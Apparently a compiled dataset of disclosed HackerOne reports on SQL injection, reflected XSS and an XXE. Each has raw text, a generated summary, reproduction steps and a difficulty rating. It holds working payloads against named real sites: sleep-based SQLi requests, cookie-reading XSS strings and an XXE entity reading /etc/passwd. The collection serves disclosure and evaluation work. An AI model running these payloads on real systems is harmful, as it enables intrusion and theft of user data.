The attack involves understanding and manipulating SQL injection payloads to infer database information based on application responses. While the concept of Blind SQL Injection is well-known, crafting the specific payloads and interpreting the responses requires some expertise. The attack does not involve complex application states or novel logic, but it does require knowledge of SQL functions like DECODE and lpad.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2633959: SQL injection in URL path leads to Database Access
================================================================================
RAW DESCRIPTION:

Summary:
The application https://corporate.admyntec.co.za/ application has an SQL injection in the URL paths since it takes the ID numbers in there and insert them directly into the backend SQL query without sanitizing them. In the registration, user ID number(Passport or National ID), Organization number are requested, as well as relevant docs. These are all stored in the backend Database.
https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0
Steps To Reproduce:
Using the URL generated when we get displayed the Insurance.
<image_0>
Introduce a single quote next to the customerId number and you realize this breaks the backend query.
Code 120 Bytes
1https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0  
<image_1>
<image_2>
Please Note That This Occurs throughout many URL paths in the application.
Recommendation
If you are taking parameters and inserting them into the backend SQL query, sanitize them to do away with any special characters attached to them.
Consider putting the application behind a WAF to make a potential SQLi vulnerability exploitation a bit tedious for an attacker.
Impact
An attacker can exploit this to dump and download the backend database. This will give them access user information.



================================================================================
Vulnerability Description:
The application is vulnerable to SQL injection via URL path parameters. The ID numbers in the URL are directly inserted into backend SQL queries without proper sanitization, allowing an attacker to manipulate the queries and potentially access the database.

Steps to Reproduce:
1. Navigate to the URL: https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562/contactPersonId/0
2. Modify the URL by adding a single quote after the customerId number: https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple manipulation of URL parameters, a common technique for testing SQL injection vulnerabilities. The attack does not require understanding complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/319279: [critical] sql injection by GET method
================================================================================
RAW DESCRIPTION:

Hey there, after tampering a bit with the values, since I figured out your backend is not php (most likely django or nodejs), I found an SQL injection .
You can view my steps to reproduce, if you need additional screenshots, please let me know.
Regards Gabriel Kimiaie
Impact
If I dig deeper, I may be able to read datas from your database, hopefully I won't do it.
The hacker selected the SQL Injection weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
Verified
Yes
What exploitation technique did you utilize?
Boolean
Please describe the results of your verification attempt.
After submitting a single quote, I got the 500 error. after few steps, I got rid of the 500 error by forging a valid sql query which is as follows:
https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv
it returns to me all csv since 1 is equal to one
when changing the boolean condition:
https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv
(and '1'=='0): only the english csvs are shown.



================================================================================
Vulnerability Description:
The vulnerability is an SQL injection via the GET method, where the attacker can manipulate URL parameters to inject SQL queries. This allows the attacker to bypass intended query logic and potentially access unauthorized data from the database.

Steps to Reproduce:
1. Identify a URL endpoint that appears to handle dynamic content, such as https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv
2. Modify the URL by injecting SQL conditions (e.g., changing '1'=='1' to '1'=='0') to observe different responses from the server
Exploitation Difficulty:
The attack involves straightforward manipulation of URL parameters to inject SQL conditions, which is a common and well-documented technique. The complexity is low because it does not require understanding complex application states or novel logic, and the interaction between components is obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/348047: Code reversion allowing SQLI again in ███████
================================================================================
RAW DESCRIPTION:

Summary:
I just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch. Additionally I'd please request that the images in the report to be censored or redacted as it's been made vulnerable again.
Description:
A code reversion made a previously patched sql injection vulnerable, allowing attackers to once again attack and access the back end DB.
## Impact
High
## Step-by-step Reproduction Instructions
POST /elist/email_aba.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1
lname=S&userid=admin'%2b(select*from(select(sleep(3)))a)%2b'&pw=admin
vs
POST /elist/email_aba.php HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://████████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1
lname=S&userid=admin'%2b(select*from(select(sleep(0)))a)%2b'&pw=admin
Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Take down subdomain if not needed any more
Impact
Access database information, steal sensitive PII or information
The hacker selected the SQL Injection weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
Verified
Yes
What exploitation technique did you utilize?
Time delay
Please describe the results of your verification attempt.
Observed time delays when using sleep comands



================================================================================
Vulnerability Description:
A previously patched SQL injection vulnerability has been reintroduced due to a code reversion, allowing attackers to execute arbitrary SQL commands and potentially access sensitive database information.

Steps to Reproduce:
1. Send a POST request to /elist/email_aba.php with a malicious SQL injection payload in the 'userid' parameter, such as: admin'%2b(select*from(select(sleep(3)))a)%2b'
2. Observe the response time delay indicating successful SQL injection execution
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection technique using time-based delays, which is a well-known and commonly tested attack vector. The attack does not require complex application state manipulation or understanding of subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/447742: SQL Injection in Login Page: https://█████/█████████/login.php
================================================================================
RAW DESCRIPTION:

Summary:
I believe I've discovered an error based SQL injection in the login page for https://████/██████/login.php.
Description:
When browsing to the webpage https://█████/██████/login.php and entering certain control characters into the "Username" field, and SQL error (Oracle) is produced.
Impact
This is hard to gauge as I did not attempt to fully exploit the SQL injection point. Once I identified that it was an error-based SQL injection, I stopped. The website also has a Web Application Firewall and IPS implemented, so bypasses would need to be used to fully exploit it. I didn't know the rules for this program in regard to bypasses defenses with automated tools like sqlmap the --tamper parameter.
Step-by-step Reproduction Instructions
Browse to https://█████████/███/login.php
Enter " '; -- " into the username field
The error "ORA-00933: SQL command not properly ended" is produced
Product, Version, and Configuration (If applicable)
██████████ █████████ Portal
Version: 3.0.89
Last Modified: Oct 04, 2018
Suggested Mitigation/Remediation Actions
Parameterized queries should be used to separate the command and data portions of the intended query to the database. These queries prevent an attacker from tampering with the query logic and extending a concatenated database query string. Code reviews should be conducted to identify any additional areas were the application or other applications in the organization are vulnerable to this attack.
Additionally, input validation should be enforced on the server side in order to ensure that only expected data is sent in queries. Where possible security specific libraries should be used in order to provide an additional layer of protection.
Impact
A skilled attacker could likely gain access to the database for the website, and depending on the privileges of the database user, gain access to other databases or compromise the system hosting the database engine.



================================================================================
Vulnerability Description:
An error-based SQL injection vulnerability exists in the login page, where entering certain control characters in the 'Username' field triggers an Oracle SQL error, indicating improper handling of user input in database queries.

Steps to Reproduce:
1. Browse to https://█████████/███/login.php
2. Enter " '; -- " into the username field
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires entering basic SQL injection payloads into a single input field and observing the error response. There are no complex interactions or state manipulations involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/488795: SQL injection on the https://████/
================================================================================
RAW DESCRIPTION:

Description
Hello. I was able to find Blind SQL injection on the https://███/
Database appears to be MySQL 5.
POC
Code 534 Bytes
1GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
2Host: ██████
3Connection: keep-alive
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
8Accept-Encoding: gzip, deflate, br
9Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
10Cookie: _ga=GA1.2.1697249984.1548431559
11
12
By issuing sleep(0) response will be delayed to 0 seconds.
By issuing sleep(1) response will be delayed to 5 seconds.
By issuing sleep(2) response will be delayed to 10 seconds.
By issuing sleep(5) response will be delayed to 25 seconds.
As POC, I retrieved count of databases (3). No other information was accessed (such as tables or data):
Apparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.
Impact
SQL injection usually have high-critical impact.



================================================================================
Vulnerability Description:
The vulnerability is a Blind SQL injection in the /library.php endpoint, where the doc_id parameter is vulnerable. The attacker can inject SQL commands that cause the database to delay its response, confirming the injection. The database appears to be MySQL 5, and the SQL statement is executed 5 times on the database side, as evidenced by the response time being 5 times the supplied sleep value.

Steps to Reproduce:
1. Send a GET request to /library.php with the parameter path=test&doc_id=1 AND (SELECT * FROM (SELECT(SLEEP(1)))WUeh
2. Observe the response time to confirm the SQL injection vulnerability (response time increases proportionally to the sleep value)
Exploitation Difficulty:
The attack involves a straightforward SQL injection technique using time-based blind SQL injection. The discovery requires basic understanding of SQL injection and the use of time delays to confirm the vulnerability. There are no complex interactions or multiple components involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/761304:  SQL Injection on cookie parameter
================================================================================
RAW DESCRIPTION:

Summary:
Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.
I did not attempt to exfiltrate data as this is obvious indication of SQLi.
Code 497 Bytes
1GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
2Host: mtn.com.ye
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-GB,en;q=0.5
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
9Upgrade-Insecure-Requests: 1
I would like to ask for permission for further exploiting this issue.
Impact
Web application is vulnerable to SQL injection, allowing access to data



================================================================================
Vulnerability Description:
The web application is vulnerable to SQL injection via the 'lang' parameter in cookies. Injecting a single quote (') causes an SQL error, indicating improper input sanitization. This allows an attacker to potentially exfiltrate data or perform other malicious SQL operations.

Steps to Reproduce:
1. Send a GET request to /index.php/search/default?t=1&x=0&y=0 with a modified 'lang' cookie parameter containing a single quote (') to trigger an SQL error.
2. Observe the SQL error in the response, confirming SQL injection vulnerability. Inject a second quote ('') to see the error disappear, further confirming the vulnerability.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple manipulation of a cookie parameter and observing the SQL error response. No complex interactions or state manipulations are required.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Reflected Vulnerabilities (12 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1051373: XSS Reflected on reddit.com via url path
================================================================================
RAW DESCRIPTION:

Hi I found a XSS-R
To reproduce the issue please click the poc link and then press the "verify email" button
PoC:
https://www.reddit.com/verification/asd',%20alert(document.location),%20%27
Impact
With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
It is also possible to inject html thus modifying the original page



================================================================================
Vulnerability Description:
This is a reflected Cross-Site Scripting (XSS) vulnerability on reddit.com. The vulnerability allows an attacker to inject malicious JavaScript code via the URL path, which is then executed when the user interacts with the 'verify email' button. This can lead to various malicious activities such as cookie theft, session hijacking, malware download, and page defacement.

Steps to Reproduce:
1. Navigate to the PoC link: https://www.reddit.com/verification/asd',%20alert(document.location),%20%27
2. Press the 'verify email' button
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of JavaScript code into the URL path, which is a common and well-documented attack vector. The interaction required to trigger the XSS is minimal and does not involve complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1221942: Shop - Reflected  XSS  With  Clickjacking Leads to Steal User's Cookie  In Two Domain
================================================================================
RAW DESCRIPTION:

Hii  Security Team ,
I am S Rahul MCEH(Metaxone Certified Ethical Hacker) and a Security Researcher I just checked your website and found Reflected XSS to Good XSS Clickjacking In Two Domain
Description:- As the search parameter is vulnerable to XSS and but the plus point is there is  no X-Frame-Header or Click-jacking Protection.So by combing this two methods the Attack Easier And Converted it to Well Working XSS on Other User’s .
Vulnerable Urls:- https://marthastewart.com/shop/all.html?s=
                            https://bhg.com/shop/all.html?s=
Steps to reproduce :-
Navigate to  Vulnerable URLS and As we know that ?s= parameter is vulnerable to XSS
2.As Reflected XSS Occurs on :-
Example1 :-  https://bhg.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
Example2 :-  https://marthastewart.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
3.The attacker can use different Payloads like document.domain etc
4.Now as we know there is no X-Frame-Header or Click-jacking Protection that can leads to successful attack
5.Now we will create POC.html to send the victim and steal the cookies of the other users { POC.html is attached below }
6.Now as the victim opens the POC.html the attacker will get the cookies of the users or victim
Refernces:-
https://arbazhussain.medium.com/self-xss-to-good-xss-clickjacking-6db43b44777e
https://hackerone.com/reports/470206
https://hackerone.com/reports/892289
Impact
Impact
By exploiting this Vulnerability
1.An attacker can force the customer to execute XSS and Steal user's cookie.
2.Launch advanced phishing attacks by rendering arbitrary HTML forms.
3.Force users to download malware/viruses.
4.Execute browser-based attacks etc.



================================================================================
Vulnerability Description:
The vulnerability combines reflected XSS with clickjacking due to missing X-Frame-Options headers. An attacker can craft a malicious page that embeds the vulnerable site in an iframe, tricking users into executing XSS payloads that steal their cookies.

Steps to Reproduce:
1. Navigate to the vulnerable URLs: https://marthastewart.com/shop/all.html?s= or https://bhg.com/shop/all.html?s=
2. Inject a reflected XSS payload into the 's' parameter, such as: %E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
3. Observe that the payload executes, confirming the XSS vulnerability
4. Create a POC.html file that embeds the vulnerable URL in an iframe (due to lack of X-Frame-Options header) to perform clickjacking
5. Send the POC.html to a victim. When opened, it will execute the XSS payload and steal the victim's cookies
Exploitation Difficulty:
The attack requires combining two well-known vulnerabilities (XSS and clickjacking) but doesn't involve complex interactions or novel logic. The steps are straightforward once the basic vulnerabilities are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1264832: Reflected Cross-Site scripting in : mtn.bj
================================================================================
RAW DESCRIPTION:

Hello Team
I have found a Reflected XSS vulnerability in mtn.jb by file name
Steps To Reproduce:
[add details for how we can reproduce the issue]
go to :
████
enter any email and press Suivant
fill all the inputs by any data .
in file upload upload any photo with payload file name : "><img src=x onerror=alert(document.cookie);.jpg
5 . the payload executed in the page
Supporting Material/References:
1 - video showing poc
2 - screenshot
Impact
An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page



================================================================================
Vulnerability Description:
A Reflected Cross-Site Scripting (XSS) vulnerability exists in mtn.bj, where an attacker can execute arbitrary JavaScript code by uploading a file with a maliciously crafted filename. This allows the attacker to steal sensitive information such as cookies or session tokens from users who interact with the affected page.

Steps to Reproduce:
1. Navigate to the target website (mtn.bj)
2. Enter any email and press 'Suivant'
3. Fill all input fields with arbitrary data
4. Upload a photo with the malicious filename: "><img src=x onerror=alert(document.cookie);.jpg
5. Observe the payload execution in the page
Exploitation Difficulty:
The vulnerability involves a straightforward file upload with a malicious filename, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require any complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1264834: cross site scripting in : mtn.bj
================================================================================
RAW DESCRIPTION:

Summary:
Xss vulnerability in mtn.bj in file name
Steps To Reproduce:
1.Go to :
https://www.mtn.bj/business/ressources/formulaires/plan-de-localisation-de-compte/?next=https://www.mtn.bj/business/ressources/formulaires/formulaire-de-souscription/
2 - fill all inputs with any data
3 - in file upload upload a file with payload file name such as : "><img src=x onerror=alert(document.cookie);.jpg
4-the payload will executed in the page .
Supporting Material/References:
1 - video showing poc
2 - screen shot
Impact
execute malicious java script in user browser



================================================================================
Vulnerability Description:
Cross-site scripting (XSS) vulnerability in mtn.bj allows execution of malicious JavaScript via a crafted file name during file upload.

Steps to Reproduce:
1. Go to: https://www.mtn.bj/business/ressources/formulaires/plan-de-localisation-de-compte/?next=https://www.mtn.bj/business/ressources/formulaires/formulaire-de-souscription/
2. Fill all inputs with any data
3. In file upload, upload a file with payload file name such as: "><img src=x onerror=alert(document.cookie);.jpg
4. The payload will be executed in the page
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS payload in a file name, a well-known attack vector. No complex interactions or state manipulations are required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1451394: POST BASED REFLECTED XSS IN dailydeals.mtn.co.za
================================================================================
RAW DESCRIPTION:

Summary:
Dear Team ,
I have found a post based reflected XSS in https://dailydeals.mtn.co.za/ .
Steps To Reproduce:
1.Create a html file with following content .
2.Open the HTML file in any web-browser.
3.Cross site Scripting will be triggered .
Impact
Attacker can exploit this vulnerability to steal users cookies , redirect them to arbitrary domain and perform various attacks.



================================================================================
Vulnerability Description:
A post based reflected XSS vulnerability in https://dailydeals.mtn.co.za/ allows an attacker to execute arbitrary JavaScript code in the context of the victim's browser, potentially leading to cookie theft, redirection to malicious sites, and other attacks.

Steps to Reproduce:
1. Create a html file with following content.
2. Open the HTML file in any web-browser.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic XSS testing techniques without requiring complex interactions or state manipulation. The attack is simple and does not involve multiple components or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1779447: Reflected - XSS
================================================================================
RAW DESCRIPTION:

Summary:
Hi, Team I'm Found Reflected XSS
Steps To Reproduce:
1.Nave to https://www.mtn.bj/
2.Go to Messages
3. Enter XSS Payload :
<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
Reflected the popup
Impact
Cross site scripting attacks can have devastating consequences. Code injected into a vulnerable application can exfiltrate data or install malware on the user's machine. Attackers can masquerade as authorized users via session cookies, allowing them to perform any action allowed by the user account.



================================================================================
Vulnerability Description:
This is a reflected Cross-Site Scripting (XSS) vulnerability where user-supplied input is not properly sanitized before being reflected back in the response. An attacker can inject malicious JavaScript code that executes when a user interacts with the injected element, potentially leading to session hijacking or other malicious actions.

Steps to Reproduce:
1. Navigate to https://www.mtn.bj/
2. Go to Messages and enter the XSS payload: <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
3. Right-click on the injected element to trigger the popup
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of a common XSS payload and does not require complex interactions or understanding of multiple components. The payload is basic and the attack surface is obvious (user input field).

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2039384: Reflected XSS in https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>
================================================================================
RAW DESCRIPTION:

Summary:
<image_0>
I reported this before in report #1737682 but it was closed as resolved while still vulnerable.
Impact
Attacker could execute js in the victim's browser.



================================================================================
Vulnerability Description:
The vulnerability is a reflected Cross-Site Scripting (XSS) issue where user-supplied input in the 'nin' parameter is directly reflected in the response without proper sanitization, allowing an attacker to execute arbitrary JavaScript in the victim's browser.

Steps to Reproduce:
1. Navigate to the URL: https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>
2. Replace <VULNERABLE> with a JavaScript payload (e.g., <script>alert('XSS')</script>)
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of a JavaScript payload into a URL parameter, which is a common and well-known attack vector. There are no complex interactions or state manipulations required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/258198: The Custom Emoji Page has a Reflected XSS
================================================================================
RAW DESCRIPTION:

The Custom Emoji Page has a Reflected XSS in building flash message.
The following is the PoC.
https://{team}.slack.com/customize/emoji?added=1&name=vuln"><script>alert(0);<%2Fscript>



================================================================================
Vulnerability Description:
The Custom Emoji Page has a Reflected XSS vulnerability in the building flash message. The vulnerability allows an attacker to inject arbitrary JavaScript code via the 'name' parameter in the URL, which is then executed in the context of the user's browser.

Steps to Reproduce:
1. Navigate to the custom emoji page URL: https://{team}.slack.com/customize/emoji
2. Append the following query string to the URL: ?added=1&name=vuln"><script>alert(0);<%2Fscript>
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple reflected XSS attack via URL parameter manipulation. There are no complex interactions or state manipulations required, and the attack vector is a common one in web applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/296701: SSL-protected Reflected XSS in m.uber.com
================================================================================
RAW DESCRIPTION:

Summary
m.uber.com is susceptible to reflected XSS
Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com
Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1
Specifics
From the rendered web page:
Code 145 Bytes
1{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.
Impact
An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.



================================================================================
Vulnerability Description:
The m.uber.com website is vulnerable to reflected Cross-Site Scripting (XSS) through a malformed URL parameter. The vulnerability allows an attacker to inject arbitrary JavaScript code that gets executed in the context of the victim's browser session when they visit a specially crafted URL. This could be used to steal sensitive information like login credentials, payment details, or perform other malicious actions.

Steps to Reproduce:
1. Navigate to the URL: https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1
2. Observe the reflected XSS payload executing in the browser, demonstrating the vulnerability
Exploitation Difficulty:
This is a straightforward reflected XSS vulnerability that doesn't require complex application state manipulation or understanding of subtle component interactions. The attack vector is simple (URL parameter manipulation) and the vulnerability follows common XSS patterns without requiring novel exploitation techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/659419: Reflected XSS on https://make.wordpress.org via 'channel' parameter
================================================================================
RAW DESCRIPTION:

Hi there,
I just found a reflected XSS on make.wordpress.org domain.
steps to reproduce :
visit this link : https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
xss pop up will occurs
POC:
see:wp reflected xss.png
Note: it works on the latest version of firefox
Impact
some of xss impact like stealing cookies, session hijacking, etc ..



================================================================================
Vulnerability Description:
A reflected XSS vulnerability exists on the make.wordpress.org domain via the 'channel' parameter. The vulnerability allows an attacker to inject malicious JavaScript code that gets executed in the context of the victim's browser session.

Steps to Reproduce:
1. Visit the URL: https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
2. Observe the XSS pop-up displaying the document.domain
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of a malicious payload into a URL parameter, which is a common and well-documented attack vector. The attack does not require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/774792: Reflected cross-site scripting vulnerability on a DoD website
================================================================================
RAW DESCRIPTION:

Hello there !
I'd like to report a 'XSS' vulnerability on a DoD website *https://███/unit/███ ,
Here in the search engine of the website please enter the following payloads <script>alert(document.domain)</script> & you can even use this payload to steal cookies <script>alert(document.cookie)</script> and hit enter and just scroll you're mouse below the Term: <script>alert(document.domain)</script> to the three icons and as soon as you scroll you're mouse over that three icons you will notice the " pop-up "
FOR CLEAR DEMONSTRATION OF THE VULNERABILITY PLEASE REFER TO THE PROOF-OF-CONCEPT ATTACHED TO THIS REPORT.
Thanks,
████
Impact
XSS vulnerabilities can be used to trick a web user into executing a malicious script, potentially revealing a user's web session information or modify web content & even steal cookies.



================================================================================
Vulnerability Description:
This is a reflected cross-site scripting (XSS) vulnerability on a DoD website. The vulnerability allows an attacker to inject malicious scripts into the search functionality, which are then executed in the context of the user's browser. This can be used to steal cookies, modify web content, or perform other malicious actions.

Steps to Reproduce:
1. Navigate to the DoD website at *https://███/unit/███
2. Enter the payload `<script>alert(document.domain)</script>` or `<script>alert(document.cookie)</script>` in the search engine and hit enter
3. Scroll the mouse below the search term to the three icons and hover over them to trigger the pop-up alert
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of common XSS payloads into a search field, which is a well-known and commonly tested attack vector. The attack does not require multiple components, complex application states, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/976657: Reflected XSS on a Atavist theme at external_import.php
================================================================================
RAW DESCRIPTION:

Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called scripts on this php file.
Basically, the endpoint prints value of scripts parameter to <script src='$Value'>.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
Also there is no secure flag on the session cookie (periodicSessionatavist). So this XSS leads to account takeover.
Impact
Reflected XSS - account takeover via cookie stealing
Thanks,
Bugra



================================================================================
Vulnerability Description:
Reflected XSS vulnerability in the 'scripts' parameter of external_import.php file, which allows arbitrary JavaScript execution due to lack of output encoding. The vulnerability can lead to account takeover via cookie stealing since the session cookie lacks secure flag.

Steps to Reproduce:
1. Identify the vulnerable endpoint: https://magazine.atavist.com/static/external_import.php
2. Inject malicious script via the 'scripts' parameter: https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple parameter manipulation with no complex interactions or state manipulations required. The attack vector is a common XSS pattern with no novel logic.

--------------------------------------------------------------------------------



Command Injection - Generic Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/106797: [marketplace.informatica.com] - XXE
================================================================================
RAW DESCRIPTION:

Request:
POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1
Host: marketplace.informatica.com
Connection: keep-alive
Content-Length: 140
Accept: */*
X-J-Token: no-user
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Origin: https://marketplace.informatica.com
Content-Type: application/json
Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
{"params":{"source":"marketplace","rows":5,"offset":0,"queryParams":{"query":"lol","fieldList":"[\"id\", \"title\"]","sortBy":"relevance"}}}
But, if we change content-type to application/xml and convert JSON to XML:
POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1
Host: marketplace.informatica.com
Connection: keep-alive
Content-Length: 350
Accept: */*
X-J-Token: no-user
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Origin: https://marketplace.informatica.com
Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Content-Type: application/xml;charset=UTF-8
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>
<params>
<offset>0</offset>
<queryParams>
<query>&xxe;</query>
<sortBy>relevance</sortBy>
<fieldList>["id", "title"]</fieldList>
</queryParams>
<source>marketplace</source>
<rows>5</rows>
</params>
I get response: JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory).
Then, i try to get /etc/passwd with OOB vector:
